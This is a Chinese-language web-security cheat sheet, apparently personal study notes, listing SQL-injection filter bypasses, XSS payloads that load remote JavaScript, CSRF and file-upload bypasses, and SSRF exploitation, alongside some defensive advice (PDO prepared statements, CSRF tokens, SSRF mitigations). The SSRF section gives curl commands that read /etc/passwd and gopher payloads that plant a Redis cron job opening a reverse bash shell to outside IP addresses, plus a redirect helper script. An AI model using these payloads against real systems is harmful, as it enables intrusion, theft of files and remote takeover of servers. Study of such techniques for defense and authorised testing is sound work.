# 信息




# 漏洞

## SQL注入

### 绕过

#### 1.绕过空格（注释符/* */，%a0）：
　　两个空格代替一个空格，用Tab代替空格，%a0=空格：
`%20` `%09` `%0a` `%0b` `%0c` `%0d` `%a0` `%00` `/**/`  `/*! */`
最基本的绕过方法，用注释替换空格：
/*  注释 */

使用浮点数：
`select * from users where id=8E0union select 1,2,3`
`select * from users where id=8.0 select 1,2,3`

#### 2.括号绕过空格：
　　如果空格被过滤，括号没有被过滤，可以用括号绕过。
　　**在MySQL中，括号是用来包围子查询的**。因此，**任何可以计算出结果的语句，都可以用括号包围起来**。**而括号的两端，可以没有多余的空格**。
例如：
`select(user())from dual where(1=1)and(2=2)`
　　这种过滤方法常常用于time based盲注,例如：
`?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23`
（from for属于逗号绕过下面会有）
　　上面的方法既没有逗号也没有空格。猜解database()第一个字符ascii码是否为109，若是则加载延时。

#### 3.引号绕过（使用十六进制）：
　　会使用到引号的地方一般是在最后的where子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：
`select column_name  from information_schema.tables where table_name="users"`
　　这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。
　　users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：
`select column_name  from information_schema.tables where table_name=0x7573657273`

#### 4.逗号绕过（使用from或者offset）：
　　在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：
`select substr(database() from 1 for 1);`
`select mid(database() from 1 for 1);`

- 使用join：
`union select 1,2`    #等价于
`union select * from (select 1)a join (select 2)b`

- 使用like：
`select ascii(mid(user(),1,1))=80`  #等价于
`select user() like 'r%'`

- 对于limit可以使用offset来绕过：
`select * from news limit 0,1`  # 等价于下面这条SQL语句
`select * from news limit 1 offset 0`

#### 5.比较符号（<>）绕过（过滤了<>：sqlmap盲注经常使用<>，使用between的脚本）：

使用greatest()、least()：（前者返回最大值，后者返回最小值）

　　同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。

　　最常见的一个盲注的sql语句：
`select * from users where id=1 and ascii(substr(database(),0,1))>64`
　　此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,...)函数返回输入参数(n1,n2,n3,...)的最大值。
　　那么上面的这条sql语句可以使用greatest变为如下的子句:
`select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64`

使用between and：
`between a and b`：返回a，b之间的数据，不包含b。

#### 6.or and xor not绕过：
and=&&  or=||   xor=|   not=!
#### 7.绕过注释符号（#，--(后面跟一个空格））过滤：
id=1' union select 1,2,3||'1
　　最后的or '1闭合查询语句的最后的单引号，或者：
id=1' union select 1,2,'3
#### 8.=绕过：
　　使用like 、rlike 、regexp 或者 使用< 或者 >
#### 9.绕过union，select，where等：
（1）使用注释符绕过：
　　常用注释符：
`//`，`--` , `/**/`, `#`, `--+`, `-- -`,` ;`,`%00`,`--a`
　　用法：
`U/**/ NION /**/ SE/**/ LECT /**/user，pwd from user`
（2）使用大小写绕过：
`id=-1'UnIoN/**/SeLeCT`
（3）内联注释绕过：
`id=-1'/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#`
（4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）：
`id=-1'UNIunionONSeLselectECT1,2,3–-`
#### 10.通用绕过（编码）：
　　如URLEncode编码，ASCII,HEX,unicode编码绕过：
`or 1=1`即`%6f%72%20%31%3d%31`，而`Test`也可以为`CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)`。
#### 11.等价函数绕过：

hex()、bin() ==> ascii()

sleep() ==>benchmark()

concat_ws()==>group_concat()

mid()、substr() ==> substring()

@@user ==> user()

@@datadir ==> datadir()

举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　

或者：
`substr((select 'password'),1,1) = 0x70`
`strcmp(left('password',1), 0x69) = 1`
`strcmp(left('password',1), 0x70) = 0`
`strcmp(left('password',1), 0x71) = -1`

#### 12.宽字节注入：
　　过滤 `'` 的时候往往利用的思路是将 `'` 转换为 `\'` 。

　　在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：
- （1）`%df` 吃掉 `\` 具体的方法是 `urlencode('\) = %5c%27`，我们在 `%5c%27` 前面添加 `%df` ，形成 `%df%5c%27` ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，`%df%5c` 就是一个汉字，`%27` 作为一个单独的（'）符号在外面：
`id=-1%df%27union select 1,user(),3--+`
- （2）将 `\'` 中的 `\` 过滤掉，例如可以构造 `%**%5c%5c%27` ，后面的 `%5c` 会被前面的 `%5c` 注释掉。

一般产生宽字节注入的PHP函数：
- 1.replace()：过滤 `'` `\` ，将 `'` 转化为 `\'` ，将 `\`  转为 `\\`，将 " 转为 `\"` 。用思路一。

- 2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：`'` , `"` , `\` 。用思路一
（防御此漏洞，要将 mysql_query 设置为 binary 的方式）

- 3.mysql_real_escape_string()：转义下列字符：
`\x00`     `\n`     `\r`     `\`     `'`     `"`     `\x1a`
（防御，将mysql设置为gbk即可）

### PDO(PHP Data ObjectPHP 数据对象)防止sql注入

我们使用传统的 mysql_connect 、mysql_query方法来连接查询数据库时，如果过滤不严，就有SQL注入风险，导致网站被攻击，失去控制。虽然可以用mysql_real_escape_string()函数过滤用户提交的值，但是也有缺陷。而使用PHP的PDO扩展的 prepare 方法，就可以避免sql injection 风险。

mysqli扩展执行sql代码是php预处理后的sql语句再用数据库执行，预处理过滤不全就导致sql注入

PDO扩展有prepare方法，调用 prepare() 时，查询语句已经发送给了数据库服务器，此时sql语句中的变量是以占位符 ? 发送过去，没有用户提交的数据；当调用到 execute()时，用户提交过来的值才会传送给数据库，他们是分开传送的，两者独立的，SQL攻击者没有一点机会。

使用PDO访问MySQL数据库时，真正的real prepared statements 默认情况下是不使用的。为了解决这个问题，你必须禁用 prepared statements的仿真效果。下面是使用PDO创建链接的例子：
```
$dbh = new PDO('mysql:dbname=dbtest;host=127.0.0.1;charset=utf8', 'user', 'pass');
$dbh->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
```

setAttribute()这一行是强制性的，它会告诉 PDO 禁用模拟预处理语句，并使用 real parepared statements。
这可以确保SQL语句和相应的值在传递到mysql服务器之前是不会被PHP解析的（禁止了所有可能的恶意SQL注入攻击）。
虽然你可以配置文件中设置字符集的属性(charset=utf8)，但是需要格外注意的是，老版本的 PHP（ < 5.3.6）在DSN中是忽略字符参数的。


demo
```
666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666
777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777
```
注意以下情况PDO不能防SQL

1、不能让占位符 ? 代替一组值，如：

`SELECT * FROM blog WHERE userid IN ( ? );`

2、不能让占位符代替数据表名或列名，如：
`SELECT * FROM blog ORDER BY ?;`

3、不能让占位符 ? 代替任何其他SQL语法，如：

`SELECT EXTRACT( ? FROM datetime_column) AS variable_datetime_element FROM blog;`

## XSS

过滤了 =()


http://xcao.vip/test/xss1.php?data=%22%3E%3Cscript%3EsetTimeout`document.write\u0028"<script src\u003d'http://xcao.vip/xss/alert.js'><\/script>"\u0029`;%3C/script%3E%3C



过滤了 =().
```
http://xcao.vip/test/xss2.php?data=%22%3E%3Cscript%3EsetTimeout`document\u002ewrite\u0028%22%3Cscript%20src\u003d%27http://xcao\u002evip/xss/alert\u002ejs%27%3E%3C\/script%3E%22\u0029`;%3C/script%3E%3C
```
过滤了 ().&#\ 注意和第二题的不同，放开了=的过滤，新增了&#\的过滤
要求加载任意JS代码,成功加载http://xcao.vip/xss/alert.js 表示完成挑战
http://xcao.vip/test/xss3.php?data="><a href="data:text/html;base64,PHNjcmlwdD5hbGVydCg2NjY2KTwvc2NyaXB0Pg==">666</a><


过滤了 =().&#\

```
http://xcao.vip/test/xss4.php?data=%22%3E%3Cscript%3Enew%20Function`//${atob`dmFyIGEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTthLnNyYz0iaHR0cDovL3hjYW8udmlwL3hzcy9hbGVydC5qcyI7ZG9jdW1lbnQuYm9keS5hcHBlbmQoYSk7`}`%3C/script%3E
```
原理：
```
new Function `a${atob `YWxlcnQoNjY2KQ==`}`
```
### 防御
1、输入过滤，输出编码，黑白名单相结合
也就是对提交的所有内容进行过滤，对url中的参数进行过滤，过滤掉会导致脚本执行的相关内容；然后对动态输出到页面的内容进行html编码，使脚本无法在浏览器中执行。虽然对输入过滤可以被绕过，但是也还是会拦截很大一部分的XSS攻击。
2、httponly可以防止XSS盗cookie



## 命令执行


## CSRF

### 绕过
referer验证，抓包直接改
origin验证，值为NULL可以绕过验证，用html内联框架，iframe

### 防范
- 使用POST提交用户数据，来代替GET
- 校验HTTP Referer：HTTP头的Referer字段记录了HTTP请求的来源地址，通过检查来源地址是来自站内还是来自远程的恶意页面，能够解决从站外发起的CSRF攻击，同时解决非法盗链，站外提交等问题
**但是Referer字段可以被修改或伪造**
- 校验origin，值为NULL的时候可以绕过，html的内联框架，iframe

- 使用验证码：每次用户提交内容时，都要求其在表单中填写图片上的随机验证码，并且在提交表单后对齐进行检测

- 使用请求令牌Token：在HTTP请求中以参数的形式加如一个随机产生的请求令牌，并在服务器端对其进行验证。如果请求中没有Token或者Token的内容不正确，则认为可能是CSRF攻击而拒绝该请求。


## 文件上传

### 绕过
前端JS：禁用JS或者抓包
黑名单绕过：phtml pht php3 php4 php5 php6 php7
Content-Type：抓包修改
文件头检测：制作图片马

都绕不过的话就找文件包含漏洞

#### PHP<5.3.4
00截断

### 防御
检查是否判断了上传文件类型及后缀
定义上传文件类型白名单，即只允许上传的文件类型
文件上传目录禁止脚本解析
对上传后的文件使用随机数改名

## SSRF

### 用途
1.扫内网，获取一些服务的banner信息
2.攻击运行在内网或本地的应用程序（比如溢出）向内部任意主机的任意端口发送精心构造的Payload
3.对内网Web应用攻击，进行指纹识别，通过访问默认文件实现
4.攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）
5.DOS攻击（请求大文件，始终保持连接Keep-Alive Always）
6.攻击内网的web应用，主要是使用GET参数就可以实现的攻击（比如struts2，sqli等）
7.利用file协议读取本地文件等

### 漏洞代码
```
function curl($url){  
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_exec($ch);
    curl_close($ch);
}

$url = $_GET['url'];
curl($url);
```

### 利用方式
利用file协议任意文件读取
curl -v 'http://sec.com:8082/sec/ssrf.php?url=file:///etc/passwd'
利用dict协议查看端口
curl -v 'http://sec.com:8082/sec/ssrf.php?url=dict://127.0.0.1:22'
利用gopher协议反弹shell
curl -v 'http://sec.com:8082/sec/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a'
限制协议为HTTP、HTTPS 设置跳转重定向为True（默认不跳转）的情况
<?php
function curl($url){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, True);
    // 限制为HTTPS、HTTP协议
    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_exec($ch);
    curl_close($ch);
}

$url = $_GET['url'];
curl($url);
?>
远程利用方式
当URL存在临时(302)或永久(301)跳转时，则继续请求跳转后的URL

那么我们可以通过HTTP(S)的链接302跳转到gopher协议上。

我们继续构造一个302跳转服务，代码如下302.php:
<?php  
$schema = $_GET['s'];
$ip     = $_GET['i'];
$port   = $_GET['p'];
$query  = $_GET['q'];
if(empty($port)){  
    header("Location: $schema://$ip/$query"); 
} else {
    header("Location: $schema://$ip:$port/$query"); 
}

利用测试
#### dict protocol - 探测Redis
dict://127.0.0.1:6379/info  
curl -vvv 'http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=dict&i=127.0.0.1&port=6379&query=info'

#### file protocol - 任意文件读取
curl -vvv 'http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=file&query=/etc/passwd'

#### gopher protocol - 一键反弹Bash
注意: gopher跳转的时候转义和`url`入参的方式有些区别

curl -vvv 'http://sec.com:8082/ssrf_only_http_s.php?url=http://sec.com:8082/302.php?s=gopher&i=127.0.0.1&p=6389&query=_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0  
a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20>&%20/dev/tcp/103.21.140.84/6789%200>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d  
%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3
%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'

### 绕过
#### 利用解析URL所出现的问题
正则表达式进行过滤（http之后到com为止的字符内容）
http://www.baidu.com@10.10.10.10与http://10.10.10.10 请求是相同的
此脚本访问请求得到的内容都是10.10.10.10的内容。
该绕过同样在URL跳转绕过中适用。
http://www.wooyun.org/bugs/wooyun-2015-091690

#### 更改IP地址写法
对传过来的URL参数进行正则匹配的方式来过滤掉内网IP，如采用如下正则表达式：

```
^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$
^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$
^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$
```

1.利用句号
127。0。0。1 >>> 127.0.0.1

2.ip地址转换成进制来访问
例如192.168.0.1这个IP地址我们可以改写成：
(1)、8进制格式：0300.0250.0.1
(2)、16进制格式：0xC0.0xA8.0.1
(3)、10进制整数格式：3232235521
(4)、16进制整数格式：0xC0A80001

3.添加端口可能绕过匹配正则
10.10.10.10:80
案例：
http://www.wooyun.org/bugs/wooyun-2014-061850


#### 用短地址（302跳转）绕过
案例：
http://www.wooyun.org/bugs/wooyun-2010-0132243
http://www.wooyun.org/bugs/wooyun-2010-0135257

(1)、在网络上存在一个很神奇的服务，http://xip.io 当我们访问这个网站的子域名的时候，例如192.168.0.1.xip.io，就会自动重定向到192.168.0.1。

(2)、由于上述方法中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，我们可以通过短地址的方式来绕过。经过测试发现新浪，百度的短地址服务并不支持IP模式，所以这里使用的是http://tinyurl.com所提供的短地址服务，如下图所示：
利用xip.io和xip.name
10.0.0.1.xip.io 10.0.0.1
www.10.0.0.1.xip.io 10.0.0.1
mysite.10.0.0.1.xip.io 10.0.0.1
foo.bar.10.0.0.1.xip.io 10.0.0.1
10.0.0.1.xip.name resolves to 10.0.0.1
www.10.0.0.2.xip.name resolves to 10.0.0.2
foo.10.0.0.3.xip.name resolves to 10.0.0.3
bar.baz.10.0.0.4.xip.name resolves to 10.0.0.4

(3)、自己写个服务接口，302跳转

### 利用Enclosed alphanumerics
ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ >>> example.com

### 通过各种非HTTP协议：
如果服务器端程序对访问URL所采用的协议进行验证的话，可以通过非HTTP协议来进行利用。

(1)、GOPHER协议：通过GOPHER我们在一个URL参数中构造Post或者Get请求，从而达到攻击内网应用的目的。例如我们可以使用GOPHER协议对与内网的Redis服务进行攻击，可以使用如下的URL：

gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1* * * * bash -i >& /dev/tcp/172.19.23.228/23330>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
(2)、File协议：File协议主要用于访问本地计算机中的文件，我们可以通过类似file:///文件路径这种格式来访问计算机本地文件。使用file协议可以避免服务端程序对于所访问的IP进行的过滤。例如我们可以通过file:///d:/1.txt 来访问D盘中1.txt的内容

### DNS Rebinding
对于常见的IP限制，后端服务器可能通过下图的流程进行IP过滤：

对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就pass掉。

但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间查，利用这个时间差，我们可以进行DNS 重绑定攻击。

要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为：

(1)、服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP

(2)、对于获得的IP进行判断，发现为非黑名单IP，则通过验证

(3)、服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。

(4)、由于已经绕过验证，所以服务器端返回访问内网资源的结果。


## 防御
1、过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。2,、统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。
3、限制请求的端口为http常用的端口，比如，80,443,8080,8090。
4、黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。
5、禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。



## 变量覆盖

### 利用
php中的$$
php中的foreach
php中的extract()函数
php中的parse_str()函数
php中的import_request_variables()函数

### 防御

变量覆盖漏洞最常见的漏洞点是在做变量注册时没有验证变量是否存在，以及在赋值给变量的时候，所以一般推荐使用原始的变量数组，如_GET、GET、_POST，或者在注册变量前一定要验证变量是否存在。
1、使用原始变量
建议不注册变量，直接用原生的_GET、_POST等数组变量进行操作，如果考虑程序可读性等原因，需要注册个别变量，可以直接在代码中定义变量，然后再把请求中的值赋值给他们。
2、验证变量存在
如果一定要使用前面几种方式注册变量，为了解决变量覆盖的问题，可以再注册变量前先判断变量是否存在。如使用extract( )函数则可以配置第二个参数为EXTR_SKIP。使用php parse_str函数注册变量前需要先自行通过代码判断变量是否存在。最重要的一点，自行申明的变量一定要初始化，不然即使注册变量代码在执行流程最前面也能覆盖掉这些未初始化的变量。


## XXE

### 防御
禁用外部实体引用
过滤关键词，不允许XML中有自定义DTD


## 反序列化

### PHP反序列化
魔术方法

## 文件包含
